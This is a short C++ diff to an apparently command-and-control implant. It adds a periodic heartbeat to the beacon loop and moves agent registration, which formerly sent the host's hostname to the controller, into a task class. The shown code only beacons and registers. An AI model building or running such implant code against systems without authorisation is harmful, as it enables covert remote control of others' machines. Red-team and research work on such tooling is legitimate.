@@ -36,6 +36,10 @@ void Implant::beacon() {
 
                 // Send Register Info
                 registerAgent(socket);
+
+                // send heartbeat every x seconds/minutes
+                heartbeat(socket);
+                
             } else {
                 // Check for specific errors
                 if (error == asio::error::connection_refused) {
@@ -55,29 +59,15 @@ void Implant::handleResponse(std::string& data) {
 }
 
 void Implant::registerAgent(asio::ip::tcp::socket& socket) {
-    // check if registered, if not register
-    std::string message = "Agent registered";
+    RegisterAgent registerAgent(id);
+    msg::Request registerResult = registerAgent.run();
+    msg::sendRequest(socket, registerResult);
+}
 
-    // build request obj
-    msg::MessageHeader header;
-    header.agent_id = id;
-    header.size = message.size();
-    header.type = msg::MessageType::RegisterAgent;
-
-    msg::Request request;
-    request.header = header;
-    json body;
-    body["message"] = message;
-
-    char hostname[256];
-    if (gethostname(hostname, sizeof(hostname)) == -1) {
-        std::cerr << "Error getting the hostname" << std::endl;
-    }
-
-    body["hostname"] = hostname;
-    request.body = body;
-
-    msg::sendRequest(socket, request);
+void Implant::heartbeat(asio::ip::tcp::socket& socket) {
+    PingTask ping(id);
+    msg::Request pingResult = ping.run();
+    msg::sendRequest(socket, pingResult);
 }
 
 void Implant::setRunning(bool running) { isRunning = running; }
